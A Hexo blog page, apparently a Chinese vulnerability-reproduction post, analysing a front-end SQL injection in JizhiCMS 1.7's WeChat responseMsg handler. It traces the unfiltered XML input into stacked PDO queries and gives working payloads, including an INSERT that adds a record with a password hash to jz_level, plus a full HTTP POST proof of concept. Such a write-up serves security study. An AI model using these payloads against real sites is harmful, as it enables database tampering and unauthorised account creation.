@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="John Doe" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      极致cms1.7 前台SQL注入2 
+      
+      
+      |
+    
+     N0puple&#39;s Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/001.ico">
+    <link rel="icon" href="/images/001.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/1.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">N0puple</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">分类</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">朋友</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">极致cms1.7 前台SQL注入2</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2021-07-07 21:50:04
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="漏洞复现">
+                    <b>#</b> 漏洞复现
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/php/" title="php">
+                    <b>#</b> php
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E6%9E%81%E8%87%B4cms/" title="极致cms">
+                    <b>#</b> 极致cms
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/sql%E6%B3%A8%E5%85%A5/" title="sql注入">
+                    <b>#</b> sql注入
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>复现了 <code>CNVD-2021-26000</code> 之后，搜索了一下极致 <code>cms</code> 相关漏洞，发现 1.7 版本的漏洞还真不少，并且还发现一个前台<code>SQL</code> 注入，跟着大佬的脚本分析一下</p>
+<h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>关于这个 <code>cms</code> 数据库方面的一些基础已经在之前发的文章中讲了一些了，数据库操作基本上没有任何防护，但是大部分的输入都是有同一套比较完善的过滤，因此我们需要找到没有过滤的输入，并且会代入数据库操作的地方</p>
+<p>这里有一处 <code>Home/c/WechatController.php</code> 的 <code>responseMsg</code> 方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$postStr</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$postStr</span>))&#123;</span><br><span class="line">    libxml_disable_entity_loader(<span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$postObj</span> = simplexml_load_string(<span class="variable">$postStr</span>, <span class="string">&#x27;SimpleXMLElement&#x27;</span>, LIBXML_NOCDATA);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;postObj = <span class="variable">$postObj</span>;</span><br><span class="line">    <span class="variable">$fromUsername</span> = <span class="variable">$postObj</span>-&gt;FromUserName;</span><br><span class="line">    <span class="variable">$toUsername</span> = <span class="variable">$postObj</span>-&gt;ToUserName;</span><br><span class="line">    <span class="variable">$keyword</span> = trim(<span class="variable">$postObj</span>-&gt;Content);</span><br><span class="line">    <span class="variable">$time</span> = time();</span><br><span class="line">    <span class="variable">$textTpl</span> = <span class="string">&quot;&lt;xml&gt;</span></span><br><span class="line"><span class="string">                    &lt;ToUserName&gt;&lt;![CDATA[%s]]&gt;&lt;/ToUserName&gt;</span></span><br><span class="line"><span class="string">                    &lt;FromUserName&gt;&lt;![CDATA[%s]]&gt;&lt;/FromUserName&gt;</span></span><br><span class="line"><span class="string">                    &lt;CreateTime&gt;%s&lt;/CreateTime&gt;</span></span><br><span class="line"><span class="string">                    &lt;MsgType&gt;&lt;![CDATA[%s]]&gt;&lt;/MsgType&gt;</span></span><br><span class="line"><span class="string">                    &lt;Content&gt;&lt;![CDATA[%s]]&gt;&lt;/Content&gt;</span></span><br><span class="line"><span class="string">                    &lt;FuncFlag&gt;0&lt;/FuncFlag&gt;</span></span><br><span class="line"><span class="string">                    &lt;/xml&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$postObj</span>-&gt;MsgType==<span class="string">&#x27;event&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$postObj</span>-&gt;Event)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;CLICK&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;subscribe&#x27;</span>:</span><br><span class="line">            <span class="variable">$openid</span> = <span class="variable">$fromUsername</span>;</span><br><span class="line">            <span class="variable">$islive</span> = M(<span class="string">&#x27;member&#x27;</span>)-&gt;find(<span class="keyword">array</span>(<span class="string">&#x27;openid&#x27;</span>=&gt;<span class="variable">$openid</span>));</span><br></pre></td></tr></table></figure>
+
+<p>首先是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$postStr</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里是直接获取数据流，赋值给 <code>$postStr</code> ，因此这里就没有其他过滤</p>
+<p>然后使用函数解析 <code>simplexml_load_string</code> ，可以用来解析 <code>xml</code> 字符串，要不是上面那一句，这里就有 <code>xxe</code> 漏洞咯</p>
+<p>接下来是一串赋值，最后进入一个 <code>if</code> 语句，只有满足 <code>$postObj-&gt;MsgType==&#39;event&#39;</code> ，才会继续向下执行，而这个值是我们可控的，不成问题，设置</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">MsgType</span>&gt;</span>&lt;![CDATA[event]]&gt;<span class="tag">&lt;/<span class="name">MsgType</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后是 <code>switch</code> 语句，比较简单，选择使得 <code>$postObj-&gt;Event ==  &#39;subscribe&#39;</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Event</span>&gt;</span>&lt;![CDATA[subscribe]]&gt;<span class="tag">&lt;/<span class="name">Event</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后会执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$openid</span> = <span class="variable">$fromUsername</span>;</span><br><span class="line"><span class="variable">$islive</span> = M(<span class="string">&#x27;member&#x27;</span>)-&gt;find(<span class="keyword">array</span>(<span class="string">&#x27;openid&#x27;</span>=&gt;<span class="variable">$openid</span>));</span><br></pre></td></tr></table></figure>
+
+<p>这里会先赋值，然后进入数据库操作，而这个 <code>$fromUsername</code> 在上面有定义</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fromUsername</span> = <span class="variable">$postObj</span>-&gt;FromUserName;</span><br></pre></td></tr></table></figure>
+
+<p>这也是可控的，可以这样</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FromUserName</span>&gt;</span>&lt;![CDATA[1]]&gt;<span class="tag">&lt;/<span class="name">FromUserName</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>最后进入到了 <code>FrPHP/lib/Model.php</code> 的 <code>find</code> 方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">find</span>(<span class="params"><span class="variable">$where</span>=<span class="literal">null</span>,<span class="variable">$order</span>=<span class="literal">null</span>,<span class="variable">$fields</span>=<span class="literal">null</span>,<span class="variable">$limit</span>=<span class="number">1</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>( <span class="variable">$record</span> = <span class="keyword">$this</span>-&gt;findAll(<span class="variable">$where</span>, <span class="variable">$order</span>, <span class="variable">$fields</span>, <span class="number">1</span>) )&#123;</span><br><span class="line">        <span class="keyword">return</span> array_pop(<span class="variable">$record</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这实际上是调用 <code>$this-&gt;findAll</code> ，只是限制了查询数量为 1，我们看 <code>$this-&gt;findAll</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">findAll</span>(<span class="params"><span class="variable">$conditions</span>=<span class="literal">null</span>,<span class="variable">$order</span>=<span class="literal">null</span>,<span class="variable">$fields</span>=<span class="literal">null</span>,<span class="variable">$limit</span>=<span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$where</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(is_array(<span class="variable">$conditions</span>))&#123;</span><br><span class="line">        <span class="variable">$join</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">foreach</span>( <span class="variable">$conditions</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span> )&#123;</span><br><span class="line">            <span class="variable">$value</span> =  <span class="string">&#x27;\&#x27;&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;\&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable">$join</span>[] = <span class="string">&quot;<span class="subst">&#123;$key&#125;</span> = <span class="subst">&#123;$value&#125;</span>&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$where</span> = <span class="string">&quot;WHERE &quot;</span>.join(<span class="string">&quot; AND &quot;</span>,<span class="variable">$join</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span> != <span class="variable">$conditions</span>)<span class="variable">$where</span> = <span class="string">&quot;WHERE &quot;</span>.<span class="variable">$conditions</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span>(is_array(<span class="variable">$order</span>))&#123;</span><br><span class="line">        <span class="variable">$where</span> .= <span class="string">&#x27; ORDER BY &#x27;</span>;</span><br><span class="line">        <span class="variable">$where</span> .= implode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$order</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">if</span>(<span class="variable">$order</span>!=<span class="literal">null</span>)<span class="variable">$where</span> .= <span class="string">&quot; ORDER BY  &quot;</span>.<span class="variable">$order</span>;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$limit</span>))<span class="variable">$where</span> .= <span class="string">&quot; LIMIT <span class="subst">&#123;$limit&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$fields</span> = <span class="keyword">empty</span>(<span class="variable">$fields</span>) ? <span class="string">&quot;*&quot;</span> : <span class="variable">$fields</span>;</span><br><span class="line">    <span class="variable">$table</span> = <span class="built_in">self</span>::<span class="variable">$table</span>;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT <span class="subst">&#123;$fields&#125;</span> FROM <span class="subst">&#123;$table&#125;</span> <span class="subst">&#123;$where&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;db-&gt;getArray(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的 <code>$conditions</code> 就是传进来的 <code>array(&#39;openid&#39;=&gt;$openid)</code> ，到最后会拼接字符串形成最后的 <code>sql</code> 语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> jz_member <span class="keyword">WHERE</span> openid <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> LIMIT <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的 1 就是传进来的值，这个值没有经过任何过滤，因此我们可以随意拼接，最后传入 <code>$this-&gt;db-&gt;getArray($sql)</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getArray</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;query(<span class="variable">$sql</span>))<span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;Statement-&gt;rowCount())<span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$rows</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$rows</span>[] = <span class="keyword">$this</span>-&gt;Statement-&gt;fetch(PDO::FETCH_ASSOC))&#123;&#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;Statement=<span class="literal">null</span>;</span><br><span class="line">    array_pop(<span class="variable">$rows</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$rows</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后就会执行 <code>$this-&gt;query($sql)</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">query</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;arrSql[] = <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;Statement = <span class="keyword">$this</span>-&gt;pdo-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;Statement) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="keyword">$this</span>-&gt;pdo-&gt;errorInfo();</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$msg</span>[<span class="number">2</span>])&#123;</span><br><span class="line">            Error_msg(<span class="string">&#x27;数据库错误：&#x27;</span> . <span class="variable">$msg</span>[<span class="number">2</span>] . end(<span class="keyword">$this</span>-&gt;arrSql));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里使用了一个 <code>pdo</code> 对象（ <code>pdo</code> 数据对象扩展是 <code>php</code> 访问数据库的一个轻量级接口，<code>PDO</code> 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。），可以使用堆叠查询</p>
+<p>执行后返回结果集，之后处理就不管了，至少执行 <code>sql</code> 之前没有任何处理，妥妥的 <code>sql</code> 注入，而且可以堆叠查询</p>
+<p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210707234408.png"></p>
+<p>放两个 <code>payload</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;select sleep(5)-- </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;insert into jz_level values(999,&#39;fff&#39;,&#39;a877cec7a6ffd70dfd313411d6196a40&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;)#</span><br></pre></td></tr></table></figure>
+
+<p>这里要记住，由于是 <code>post</code>，所以不要用 <code>xxxxxx --+</code> ，这里 <code>+</code> 不等于 <code> </code>，<code>-- </code> 或者 <code>#</code>才是注释</p>
+<p>回到最初的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$islive</span> = M(<span class="string">&#x27;member&#x27;</span>)-&gt;find(<span class="keyword">array</span>(<span class="string">&#x27;openid&#x27;</span>=&gt;<span class="variable">$openid</span>));</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$islive</span>)&#123;</span><br><span class="line">    <span class="variable">$access_token</span> = <span class="keyword">$this</span>-&gt;getAccessToken();</span><br><span class="line">    <span class="variable">$url</span> = <span class="string">&#x27;https://api.weixin.qq.com/cgi-bin/user/info?access_token=&#x27;</span>.<span class="variable">$access_token</span>.<span class="string">&#x27;&amp;openid=&#x27;</span>.<span class="variable">$openid</span>.<span class="string">&#x27;&amp;lang=zh_CN&#x27;</span>;</span><br><span class="line">    <span class="variable">$user</span> = file_get_contents(<span class="variable">$url</span>);</span><br><span class="line">    <span class="variable">$user</span> = json_decode(<span class="variable">$user</span>,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n</span> = M(<span class="string">&#x27;member&#x27;</span>)-&gt;add([<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$user</span>[<span class="string">&#x27;nickname&#x27;</span>],<span class="string">&#x27;openid&#x27;</span>=&gt;<span class="variable">$openid</span>,<span class="string">&#x27;litpic&#x27;</span>=&gt;<span class="variable">$user</span>[<span class="string">&#x27;headimgurl&#x27;</span>],<span class="string">&#x27;sex&#x27;</span>=&gt;<span class="variable">$user</span>[<span class="string">&#x27;sex&#x27;</span>],<span class="string">&#x27;regtime&#x27;</span>=&gt;<span class="variable">$time</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>查询的结果会作为 <code>islive</code> ，不存在的时候会添加一行记录，如果我们写了 <code>payload</code> ，但是这个记录是不存在的，那么第二个添加的语句就会报错，不过问题不大，该执行的都执行了</p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wechat/responseMsg.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.jizhi17.com</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>262</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://www.jizhi17.com</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://www.jizhi17.com/admin.php/Plugins/index.html</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>XDEBUG_SESSION=PHPSTORM; PHPSESSID=39m6og11d2l02ip1f3kfk13pk4</span><br><span class="line"></span><br><span class="line">&lt;xml&gt;</span><br><span class="line">&lt;ToUserName&gt;&lt;![CDATA[a]]&gt;&lt;/ToUserName&gt;</span><br><span class="line">&lt;FromUserName&gt;&lt;![CDATA[1&#x27;]]&gt;&lt;/FromUserName&gt;</span><br><span class="line">&lt;CreateTime&gt;%s&lt;/CreateTime&gt;</span><br><span class="line">&lt;MsgType&gt;&lt;![CDATA[event]]&gt;&lt;/MsgType&gt;</span><br><span class="line">&lt;Content&gt;&lt;![CDATA[%s]]&gt;&lt;/Content&gt;</span><br><span class="line">&lt;Event&gt;&lt;![CDATA[subscribe]]&gt;&lt;/Event&gt;</span><br><span class="line">&lt;FuncFlag&gt;0&lt;/FuncFlag&gt;</span><br><span class="line">&lt;/xml&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>要特别注意一些细节，就比如最后写 <code>payload</code> 的时候，我一直写的是 <code>--+</code> ，导致执行失败</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/115427747">https://blog.csdn.net/rfrder/article/details/115427747</a></li>
+</ul>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2021/07/06/%E6%9E%81%E8%87%B4cms1-7-%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84getshell/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2021-07-07 21:50:04
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="漏洞复现">
+                        <b>#</b> 漏洞复现
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/php/" title="php">
+                        <b>#</b> php
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E6%9E%81%E8%87%B4cms/" title="极致cms">
+                        <b>#</b> 极致cms
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/sql%E6%B3%A8%E5%85%A5/" title="sql注入">
+                        <b>#</b> sql注入
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%BB%86%E8%8A%82"><span class="toc-text">漏洞细节</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+
+  <div id="vcomments"></div>
+
+  <script>
+    new Valine({
+      el: '#vcomments',
+      appId: 'NDNgppjVEEzr7sUejJFVueds-gzGzoHsz',
+      appKey: 'E6rBuy0l5xXiIjq6GA24XI5J',
+      placeholder: 'Welcome!',
+      avatar: 'retro',
+      lang: 'en'
+    })
+  </script>
+
+    <style>
+      .comments-container .v .vempty {
+        display: none!important;
+      }
+    </style>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/N0puple/">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      
